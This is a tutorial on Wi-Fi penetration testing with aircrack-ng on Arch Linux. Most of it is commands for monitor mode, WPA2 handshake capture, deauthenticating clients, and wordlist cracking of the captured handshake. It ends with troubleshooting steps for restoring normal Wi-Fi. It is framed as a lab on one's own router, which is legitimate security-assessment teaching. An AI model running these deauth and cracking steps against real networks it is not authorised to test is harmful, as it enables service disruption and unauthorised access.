**airmon‑NG**

---

# 0) Important prerequisites on Arch Linux (beforehand)

On Arch, everything is in your hands, so make sure to check these:

* **The Wi‑Fi adapter must support monitor mode**

  ```bash
  iw dev
  ```

* The kernel module must not be blocked:

  ```bash
  rfkill list
  ```

If `Soft blocked: yes` appears:

```bash
sudo rfkill unblock all
```

---

# 1) Preparation: environment and tools (ARCH)

## Test network

* Your own router
* WPA2‑PSK
* At least **1 client connected** (a phone is enough)

---

## Required packages (with pacman)

```bash
sudo pacman -Syu
sudo pacman -S aircrack-ng iw wireless_tools tcpdump
```

> `airmon-ng`, `airodump-ng`, `aireplay-ng` — are **inside the aircrack-ng package**

---

## Wordlist

On Arch, rockyou is not available by default.

If it exists:

```bash
ls /usr/share/wordlists/
```

If not (create your own or from an external source):

```bash
mkdir -p ~/wordlists
```

---

# 2) Switching the Wi‑Fi adapter to monitor mode (ARCH)

## Identify the interface name

```bash
ip link
```

Example: `wlan0`

---

## Monitor mode

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Result:

* `wlan0` → `wlan0mon`

Verification:

```bash
iwconfig
```

If `Mode:Monitor` is shown — it’s ready.

---

# 3) Capturing a handshake

## View all networks

```bash
sudo airodump-ng wlan0mon
```

Write down the following:

* **BSSID**
* **CH (channel)**
* **SSID**

---

## Capture only the target network

```bash
sudo airodump-ng \
  --bssid <BSSID> \
  --channel <CH> \
  -w capture \
  wlan0mon
```

---

## Getting the handshake (2 ways)

### Option A — QUIET WAY (recommended)

* Turn your phone’s Wi‑Fi **off → on**
* At the top, `WPA handshake:` appears

---

### Option B — Deauth (lab only)

```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

This:

* Disconnects the client
* When it reconnects, the handshake appears

---

# 4) Verifying the handshake

```bash
aircrack-ng capture-01.cap
```

If at the top:

```
WPA (1 handshake)
```

appears — everything is correct.

---

# 5) Testing with a wordlist (cracking)

```bash
aircrack-ng \
  -w ~/wordlists/rockyou.txt \
  -b <BSSID> \
  capture-01.cap
```

* If the password is in the wordlist — it will be found
* If not — **it will not be found**, this is normal

---

# 6) Technical explanation (what happened)

* You did **not** break the password
* You **captured the handshake**
* Aircrack:

  * extracts the hash from the handshake
  * compares it with the wordlist
* If WPA2 is **properly configured**, a strong password **will not be cracked**

This process is for **security assessment**.

---

# 7) Cleanup on Arch (at the end)

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## HOW TO FIX WI‑FI

This problem is **very common** and in 99% of cases is caused by **kernel / NetworkManager / monitor mode leftovers**.

---

# 1) Fastest recovery (works in 80% of cases)

## 1.1 Fully disable monitor mode

```bash
sudo airmon-ng stop wlan0mon
```

If `wlan0mon` remains:

```bash
ip link
```

and force it down:

```bash
sudo ip link set wlan0mon down
```

---

## 1.2 Restart NetworkManager

```bash
sudo systemctl restart NetworkManager
```

Check:

```bash
nmcli device
```

If `wlan0` = `connected` or `disconnected` — Wi‑Fi is back.

---

# 2) If Wi‑Fi is not visible at all

## 2.1 RFKill check (most common)

```bash
rfkill list
```

If:

```
Soft blocked: yes
```

then:

```bash
sudo rfkill unblock all
```

---

## 2.2 Check if the interface exists

```bash
ip link
```

If **wlan0 does not exist at all** → driver issue.

---

# 3) Restoring the driver (critical part)

## 3.1 Identify which Wi‑Fi chipset it is

```bash
lspci | grep -i network
```

or if USB:

```bash
lsusb
```

Examples:

* Intel → `iwlwifi`
* Realtek → `rtl88xx`, `rtl8192`
* Atheros → `ath9k`, `ath10k`

---

## 3.2 Reload the kernel module

Example for Intel:

```bash
sudo modprobe -r iwlwifi
sudo modprobe iwlwifi
```

Realtek example:

```bash
sudo modprobe -r rtl88xxau
sudo modprobe rtl88xxau
```

Then:

```bash
ip link
```

---

## 3.3 Check the kernel log (IMPORTANT)

```bash
dmesg | grep -i wifi
```

or:

```bash
dmesg | grep -i firmware
```

If it says `firmware missing`:

```bash
sudo pacman -S linux-firmware
```

and **reboot**.

---

# 4) Testing with iw + wpa_supplicant instead of NetworkManager (advanced)

If NM causes issues:

```bash
sudo systemctl stop NetworkManager
sudo systemctl start wpa_supplicant
```

Do SSIDs appear:

```bash
iw dev wlan0 scan | less
```

If this works — the **driver is healthy**, the problem is in NM.

---

# 5) Last resort, but 100% solution

## 5.1 Update kernel and system

```bash
sudo pacman -Syu
```

## 5.2 Reboot

```bash
reboot
```

On Arch, a **clean reboot** solves many issues, because:

* monitor mode
* virtual interfaces
* killed processes

are fully cleared.

---

# 6) Prevention (so it doesn’t break next time)

After exiting monitor mode **always**:

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

If you do labs often:

* use a separate USB Wi‑Fi adapter
* keep the main Wi‑Fi “clean”

---
